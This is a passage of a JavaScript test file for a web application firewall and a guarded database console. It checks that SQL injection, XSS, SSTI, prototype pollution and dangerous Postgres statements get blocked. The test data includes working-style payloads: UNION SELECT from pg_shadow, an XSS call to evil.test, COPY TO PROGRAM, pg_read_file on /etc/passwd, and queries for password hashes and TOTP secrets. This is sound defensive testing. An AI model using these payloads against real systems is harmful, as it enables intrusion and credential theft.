		"?id=1' OR 'a'='a'",
		"?id=1' OR 2=2",
		'?q=1+UNION+ALL+SELECT+null,usename,passwd+FROM+pg_shadow',
		'?q=1+UNION/**/SELECT+1,2,3',
		'?sort=id;SELECT+table_name+FROM+information_schema.tables',
		'?delay=pg_sleep(10)',
	]) {
		const res = inspectRequestComponents({ pathname: '/api/uyeler', search: q });
		assert.equal(res.matched, true, q);
		assert.equal(res.category, 'sqli', q);
	}

	// Reflected XSS
	for (const q of [
		'?q=<script>alert(1)</script>',
		'?redirect=javascript:alert(document.cookie)',
		'?avatar=<img src=x onerror=alert(1)>',
		'?name=<svg onload=fetch("https://evil.test")>',
	]) {
		const res = inspectRequestComponents({ pathname: '/api/search', search: q });
		assert.equal(res.matched, true, q);
		assert.equal(res.category, 'xss', q);
	}

	// Full Request helper
	const attackReq = new Request('https://beuteknoloji.org/api/uyeler?id=1%20UNION%20SELECT%201,2,3', {
		headers: { 'user-agent': UA.linuxChrome },
	});
	const reqResult = inspectRequestPayload(attackReq);
	assert.equal(reqResult.matched, true);
	assert.equal(reqResult.category, 'sqli');
});

check('waf: inspectJsonPayload recursively detects SQLi, SSTI, Prototype Pollution in JSON bodies', () => {
	// Clean JSON
	assert.equal(inspectJsonPayload({ title: 'Toplantı Notları', content: 'Merhaba dünya', count: 42 }).matched, false);

	// Nested SQLi in JSON
	const sqliJson = {
		user: {
			preferences: {
				theme: 'dark',
				bio: "admin' UNION SELECT 1,2,3--",
			},
		},
	};
	const resSqli = inspectJsonPayload(sqliJson);
	assert.equal(resSqli.matched, true);
	assert.equal(resSqli.category, 'sqli');

	// SSTI in JSON array
	const sstiJson = { tags: ['tech', '{{7*7}}', 'club'] };
	const resSsti = inspectJsonPayload(sstiJson);
	assert.equal(resSsti.matched, true);
	assert.equal(resSsti.category, 'cmd_injection');

	// Prototype pollution key in JSON
	const protoJson = JSON.parse('{"__proto__": {"polluted": "yes"}}');
	const resProto = inspectJsonPayload(protoJson);
	assert.equal(resProto.matched, true);
	assert.equal(resProto.category, 'cmd_injection');
});

check('waf: inspectDatabaseSql and maskDatabaseRow enforce Zero-Trust Database Studio guards', () => {
	// Legitimate read/write queries
	const cleanSelect = inspectDatabaseSql('SELECT id, ad, soyad, email FROM kullanicilar LIMIT 10');
	assert.equal(cleanSelect.allowed, true);

	// Dangerous OS / file / DO block functions
	for (const badSql of [
		"COPY (SELECT 1) TO PROGRAM 'id'",
		"SELECT pg_read_file('/etc/passwd')",
		"DO $$ BEGIN EXECUTE 'DELETE FROM sistem_loglari'; END $$",
	]) {
		const res = inspectDatabaseSql(badSql);
		assert.equal(res.allowed, false, badSql);
		assert.ok(res.strikePoints >= 60, badSql);
	}

	// Protected tables cannot be mutated or dropped
	for (const badWrite of [
		'DELETE FROM sistem_loglari WHERE id = 1',
		"UPDATE guvenlik_engelleri SET status = 'whitelist'",
		'TRUNCATE TABLE kullanici_passkeyler',
		'DROP TABLE erisim_anahtarlari',
		"INSERT INTO sistem_ayarlari (anahtar, deger) VALUES ('soc_lockdown_mode', 'false')",
		"UPDATE sistem_ayarlari SET deger = 'plain' WHERE anahtar = 'smtp_pass'",
	]) {
		const res = inspectDatabaseSql(badWrite);
		assert.equal(res.allowed, false, badWrite);
	}

	// Sensitive credential columns cannot be projected via aliases to bypass row masking
	for (const secLeak of [
		'SELECT aktifOturumToken AS x FROM kullanicilar',
		'SELECT passwordHash FROM kullanicilar',
		'SELECT totpSecret, totpRecoveryCodes FROM kullanicilar',
		'SELECT secretHash FROM oauth_istemciler',
		"SELECT deger AS leak FROM sistem_ayarlari WHERE anahtar = 'smtp_pass'",
	]) {
		const res = inspectDatabaseSql(secLeak);
		assert.equal(res.allowed, false, secLeak);
	}

	// EXPLAIN mode must reject multi-statement transaction breakouts and non-read statements
	assert.equal(
		inspectDatabaseSql("SELECT 1; ROLLBACK; UPDATE kullanicilar SET roleId = 'rol_admin'", { isExplain: true }).allowed,
		false
	);
	assert.equal(
		inspectDatabaseSql("UPDATE kullanicilar SET ad = 'Test'", { isExplain: true }).allowed,
		false
	);
	const explainStripped = inspectDatabaseSql('EXPLAIN ANALYZE SELECT id, ad FROM kullanicilar;', { isExplain: true });
	assert.equal(explainStripped.allowed, true);
	assert.equal(explainStripped.normalizedExplainTarget, 'SELECT id, ad FROM kullanicilar');

	// Row masking covers column names, bcrypt/enc:v1 prefixes, and sistem_ayarlari smtp_pass
	assert.deepEqual(
		maskDatabaseRow({
			id: 'usr_1',
			email: 'test@beuteknoloji.org',
			passwordHash: 'plain-or-hashed',
			aliasedBcrypt: '$2b$10$abcdefghijklmnopqrstuv',
			aliasedCipher: 'enc:v1:123456',
		}),
		{
			id: 'usr_1',
			email: 'test@beuteknoloji.org',
			passwordHash: '••••••••',
			aliasedBcrypt: '••••••••',
			aliasedCipher: '••••••••',
		}
	);
	assert.deepEqual(
		maskDatabaseRow({ anahtar: 'smtp_pass', deger: 'unencrypted-secret-value' }),
		{ anahtar: 'smtp_pass', deger: '••••••••' }
	);
	assert.deepEqual(
		maskDatabaseRow({ anahtar: 'site_baslik', deger: 'BEÜ Teknoloji' }),
		{ anahtar: 'site_baslik', deger: 'BEÜ Teknoloji' }
	);
});

await Promise.all(pending);

console.log(process.exitCode ? 'check-pure: FAILED' : `check-pure: ${count} checks passed`);


